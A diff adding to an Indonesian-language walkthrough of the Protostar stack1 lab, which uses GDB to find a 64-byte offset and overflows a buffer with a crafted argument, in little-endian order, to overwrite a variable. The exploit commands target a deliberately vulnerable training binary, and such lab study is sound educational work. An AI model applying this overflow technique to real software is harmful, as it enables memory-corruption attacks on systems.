@@ -39,7 +39,7 @@ Pada level ini kita ditargetkan untuk mengubah variabel **modified** menjadi 0x6
 ## Lets Dive Deeper
 **[!] Disclaimer** saya disini memindahkannya dari Protostar machine kedalam local maschine saya, agar lebih mudah untuk menganalisis programnya. Disini saya juga menggunakan ekstensi dari GDB yaitu gef. Jadi alamat pada machine anda mungkin berbeda.
 
-> **gdb -q stack0** </br>
+> **gdb --args stack1 AAAA** </br>
 > **disass main**
 ```
    0x08048464 <+0>:	push   ebp
@@ -73,3 +73,81 @@ Pada level ini kita ditargetkan untuk mengubah variabel **modified** menjadi 0x6
    0x080484d5 <+113>:	leave
    0x080484d6 <+114>:	ret
 ```
+
+Dapat kita lihat bahwa di alamat **0x080484a2** terdapat fungsi strcpy() yang meminta argument ketika program dijalankan, disini kita memasukkan argumen AAAA kedalam programnya. Setelah strcpy() dijalankan kita dapat melihat pada alamat **0x080484ab** terdapat perintah cmp. Pada assembly cmp digunakan untuk membandingkan nilai satu sama lain, disini dapat dilihat register **eax** dan **0x61626364** yang dibandingkan. Namun apa nilai eax?. Lets find out! </br>
+
+Kita dapat meletakkan breakpoint pada alamat **0x080484ab** untuk melihat nilainya
+> b *0x080484ab </br>
+> x/wx $esp+0x5c  </br>
+> x/wx $eax  </br>
+
+```
+gef➤  x/wx $esp+0x5c
+0xffffcdcc:	0x00000000
+gef➤  x/wx $eax
+0x0:	Cannot access memory at address 0x0
+```
+
+Dapat kita lihat bahwa nilai dari $esp+0x5c yang dimasukkan kedalam eax adalah 0. Jadi kita dapat menduga bahwa $esp+0x5c adalah dimana nilai modified variabel disimpan. </br>
+Sekarang kita sudah mengetahui dimana modified variabel disimpan, tapi seberapa banyak karakter yang kita butuhkan untuk mengubah nilainya? </br></br>
+
+Pertama tama kita cari tahu terlebih dahulu dimana input kita disimpan. Pada alamat **0x0804849b** kita dapat melihat perintah lea *(load effective address)*, cara bekerjanya sedikit mirip dengan *mov*. Jadi coba kita lihat berapa nilai dari **$esp+0x1c**
+
+> x/wx $esp+0x1c </br>
+
+```
+gef➤  x/wx $esp+0x1c
+0xffffcd8c:	0x41414141
+```
+
+Nah 0x41414141 adalah **AAAA** yang kita masukkan sebagai argumen pada program. Jadi dapat disimpulkan alamat input kita berada pada **0xffffcd8c** dan alamat yang ingin kita ubah adalah **0xffffcdcc**. Terlihat tidak begitu jauh bukan?. Coba kita hitung seberapa banyak yang kita butuhkan.
+
+>p/d 0xffffcdcc - 0xffffcd8c
+
+```
+gef➤  p/d 0xffffcdcc - 0xffffcd8c
+$2 = 64
+```
+
+Kita sekarang tau bahwa kita membutuhkan 64 karakter untuk sampai ke alamat tersebut. Mari kita coba!
+
+```
+./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Try again, you got 0x00000000
+```
+
+Kita masih belum mengubah variabel nya, coba kita tambahkan string **BBBB** setelahnya
+
+```
+./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Try again, you got 0x42424242
+```
+
+Dapat dilihat bahwa **0x42424242** muncul sebagai representasi dari **BBBB**. Masih ingatkah anda dengan target utama kita?, yaitu mengubah variabel modified menjadi 0x61626364, yang artinya **BBBB** kita ganti dengan hex tersebut dalam ASCII. Coba kita lihat berapa hex tersebut dalam ASCII
+
+> python </br>
+> chr(0x61) + chr(0x62) + chr(0x63) + chr(0x64)
+
+```
+python
+>>> chr(0x61) + chr(0x62) + chr(0x63) + chr(0x64)
+'abcd'
+```
+Sudah kita ketahui sekarang apa saja yang kita butuhkan untuk mengubah variabelnya, mari kita coba kembali
+```
+./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd 
+Try again, you got 0x64636261
+```
+
+Ha? mengapa kita mendapatkan **0x64636261** bukan **0x61626364**?. Itu terjadi karena litle endian.
+
+### Litle Endian
+> Little-endian Menyimpan byte paling tidak signifikan (yang disebut “ujung paling kecil”) terlebih dahulu. Ini berarti bahwa byte pertama (pada alamat memori terendah) adalah yang terkecil, yang paling masuk akal bagi orang yang membaca dari kanan ke kiri
+
+Sekarang kita sudah mengetahui apa itu litle endian, mari kita coba sekali lagi dengan membaliknya menjadi **dcba** untuk mengalahkan level ini!
+```
+./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
+you have correctly got the variable to the right value
+```
+
+Yeay! Kita berhasil menyelesaikannya
